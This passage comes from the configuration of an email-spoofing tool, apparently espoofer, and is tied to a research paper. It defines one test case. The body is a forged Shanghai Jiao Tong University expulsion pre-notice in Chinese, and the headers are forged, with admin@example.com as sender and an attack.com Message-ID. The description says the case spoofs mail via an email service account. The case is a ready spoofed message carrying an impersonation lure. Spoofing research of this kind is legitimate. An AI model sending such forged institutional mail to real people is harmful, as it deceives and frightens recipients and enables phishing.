\xe3\x80\x82\xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe7\xac\xac\xe4\xb8\x89\xe5\x8d\x81\xe5\x85\xab\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x94\xef\xbc\x89\xe9\xa1\xb9\xe3\x80\x81\xe7\xac\xac\xe5\x9b\x9b\xe5\x8d\x81\xe5\x9b\x9b\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x8c\xef\xbc\x89\xe9\xa1\xb9\xe8\xa7\x84\xe5\xae\x9a\xef\xbc\x8c\xe5\xba\x94\xe4\xba\x88\xe9\x80\x80\xe5\xad\xa6\xef\xbc\x8c\xe5\xad\xa6\xe6\xa0\xa1\xe7\x8e\xb0\xe5\x90\x91\xe4\xbd\xa0\xe5\x8f\x91\xe5\x87\xba\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe9\xa2\x84\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe3\x80\x82\r\n    \xe8\xaf\xb7\xe5\x9c\xa8\xe6\x94\xb6\xe5\x88\xb0\xe6\x9c\xac\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe5\x90\x8e2\xe5\x91\xa8\xe5\x86\x85\xe5\x8a\x9e\xe7\x90\x86\xe5\xa5\xbd\xe9\x80\x80\xe5\xad\xa6\xe5\x92\x8c\xe7\xa6\xbb\xe6\xa0\xa1\xe6\x89\x8b\xe7\xbb\xad\xe3\x80\x82\xe5\xa6\x82\xe4\xbd\xa0\xe5\xaf\xb9\xe6\x9c\xac\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe9\xa2\x84\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe6\x9c\x89\xe5\xbc\x82\xe8\xae\xae\xef\xbc\x8c\xe5\x8f\xaf\xe4\xbb\xa5\xe8\x87\xaa\xe6\x94\xb6\xe5\x88\xb0\xe6\x9c\xac\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe4\xb9\x8b\xe6\x97\xa5\xe8\xb5\xb75\xe6\x97\xa5\xe5\x86\x85\xef\xbc\x8c\xe5\x90\x91\xe5\xad\xa6\xe9\x99\xa2\xe6\x8f\x90\xe5\x87\xba\xe9\x99\x88\xe8\xbf\xb0\xe3\x80\x81\xe7\x94\xb3\xe8\xbe\xa9\xef\xbc\x8c\xe9\x80\xbe\xe6\x9c\x9f\xe8\xa7\x86\xe4\xb8\xba\xe4\xbd\xa0\xe6\x94\xbe\xe5\xbc\x83\xe6\x9d\x83\xe5\x88\xa9\xe3\x80\x82\xe5\xa6\x82\xe6\xb2\xa1\xe6\x9c\x89\xe5\xbc\x82\xe8\xae\xae\xef\xbc\x8c\xe6\x88\x96\xe8\x80\x85\xe9\x99\x88\xe8\xbf\xb0\xe3\x80\x81\xe7\x94\xb3\xe8\xbe\xa9\xe7\x9a\x84\xe7\x90\x86\xe7\x94\xb1\xe4\xb8\x8d\xe6\x88\x90\xe7\xab\x8b\xef\xbc\x8c\xe8\xaf\xb7\xe4\xbd\xa0\xe5\x9c\xa8\xe8\xa7\x84\xe5\xae\x9a\xe6\x97\xb6\xe9\x97\xb4\xe5\x86\x85\xe5\x8a\x9e\xe7\x90\x86\xe5\xa5\xbd\xe9\x80\x80\xe5\xad\xa6\xe5\x92\x8c\xe7\xa6\xbb\xe6\xa0\xa1\xe6\x89\x8b\xe7\xbb\xad\xe3\x80\x82\xe9\x80\xbe\xe6\x9c\x9f\xe5\xad\xa6\xe6\xa0\xa1\xe5\xb0\x86\xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe5\xaf\xb9\xe4\xbd\xa0\xe4\xbd\x9c\xe5\x87\xba\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe5\x86\xb3\xe5\xae\x9a\xe3\x80\x82\r\n    \xe7\x89\xb9\xe6\xad\xa4\xe5\x91\x8a\xe7\x9f\xa5\xe3\x80\x82",
            # "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@example.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
            # "other_headers": b"Date: " + get_date() + b"\r\n" + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
            # "other_headers": b"Date: " + get_date(),
            # "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: X-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
        # 通过电子邮件服务帐户进行欺骗
    },
}
